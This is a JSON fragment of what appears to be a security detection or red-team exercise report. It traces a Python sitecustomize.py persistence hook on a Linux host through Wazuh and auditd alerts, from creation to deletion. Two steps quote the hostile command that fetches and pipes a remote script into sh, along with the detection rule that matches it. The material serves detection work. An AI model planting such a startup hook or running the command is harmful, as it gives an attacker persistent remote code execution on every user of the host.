  "attack_progression": [
    {"step": 1, "tactic": "Persistence / Event Triggered Execution — Python Startup Hook", "technique": "T1546", "what_happened": "At 2027-09-14 03:11:08 CEST, Wazuh FIM (syscheck) reported a new file added in a monitored directory on ubuntu-dev-pyhost-04 (agent.id=041, agent.ip=10.108.57.186): syscheck.path=/usr/lib/python3/dist-packages/sitecustomize.py, syscheck.event='added', size 198 bytes, owner root. The file did NOT exist before this event and is not part of any apt-tracked package (no dpkg ownership). sitecustomize.py is auto-imported by every Python interpreter invocation before user code — writing a script there grants system-wide Python-startup persistence (MITRE T1546). This is the canonical PDF artefact E for playbook 056.", "chain_reason": "Wazuh FIM rule 550 'File added in monitored dir' fired on syscheck.path=/usr/lib/python3/dist-packages/sitecustomize.py. The path is on the playbook-056 high-value watchlist (Python site-packages directory) and the file is not dpkg-owned — both conditions trigger the persistence subrule with MITRE T1546.", "first_seen": "2027-09-14T03:11:08+0200"},
    {"step": 2, "tactic": "Persistence / Hook Content Inspection", "technique": "T1546", "what_happened": "At 03:11:14 CEST (6 seconds later), the Wazuh content-inspection rule scanned the newly-added sitecustomize.py and flagged it: the file contains 'import os' followed by os.system('curl -fsSL http://185.62.190.144/x.sh | sh &'). This is the exact PDF-artefact-E pattern: a startup hook that fetches and executes a remote shell payload at every Python invocation. The hook is configured as a background process (&) so the parent python3 returns immediately while the curl|sh continues silently.", "chain_reason": "Wazuh custom rule 61410 'sitecustomize.py contains os.system curl|sh' fired with rule.mitre.id=T1546 on the FIM-added file from step 1. The 6-second gap between step 1 (FIM add) and step 2 (content scan) is the normal Wazuh content-inspection latency.", "first_seen": "2027-09-14T03:11:14+0200"},
    {"step": 3, "tactic": "Execution / Triggered Hook — python3 spawns sh + curl", "technique": "T1059.004", "what_happened": "At 03:14:31 CEST (≈3min23s after the file was written — operator deliberately held the file ≥90s for FIM detection then invoked python3 to fire the hook), Linux auditd captured the process tree exactly matching the playbook's expected detection signal: data.audit.exe=/usr/bin/python3 with data.audit.command=python3 -c pass, parent of /bin/sh -c 'curl -fsSL http://185.62.190.144/x.sh | sh &', which itself parented /usr/bin/curl -fsSL http://185.62.190.144/x.sh. The data.audit.uid=1000 (regular developer account, not root) but the sitecustomize.py is in /usr/lib/python3/dist-packages owned by root — meaning the persistence affects EVERY user who runs python3 on this host, not just uid 1000.", "chain_reason": "Wazuh rule 92105 'Python interpreter spawns shell + curl' fired with rule.mitre.id=T1546 + T1059.004 when auditd execve events showed parent data.audit.exe=python3 + child data.audit.exe=sh + grandchild data.audit.exe=curl within the same audit session, all under data.audit.uid=1000. The auditd EXECVE chain is the literal evidence the hook fired.", "first_seen": "2027-09-14T03:14:31+0200"},
    {"step": 4, "tactic": "Defense Evasion / File Cleanup", "technique": "T1070.004", "what_happened": "At 03:19:42 CEST (≈5min11s after hook execution), Wazuh FIM reported syscheck.event='deleted' for syscheck.path=/usr/lib/python3/dist-packages/sitecustomize.py — the attacker removed the dropper file after the hook had fired at least once and the second-stage payload (curl|sh) had been downloaded. The persistence file is gone but the second-stage payload (whatever curl|sh downloaded) may have established its own persistence elsewhere and the hook will NOT re-fire on next python3 invocation (since the file is removed). This is anti-forensics housekeeping (T1070.004) typical of competent operators.", "chain_reason": "Wazuh FIM rule 550 fired again on the same syscheck.path with syscheck.event='deleted', closing the persistence file lifecycle (added→executed→deleted) within an 8-minute window. The cleanup pattern is the operator-skill signature distinguishing a deliberate red-team / APT actor from a noisy malware family that leaves files behind.", "first_seen": "2027-09-14T03:19:42+0200"}
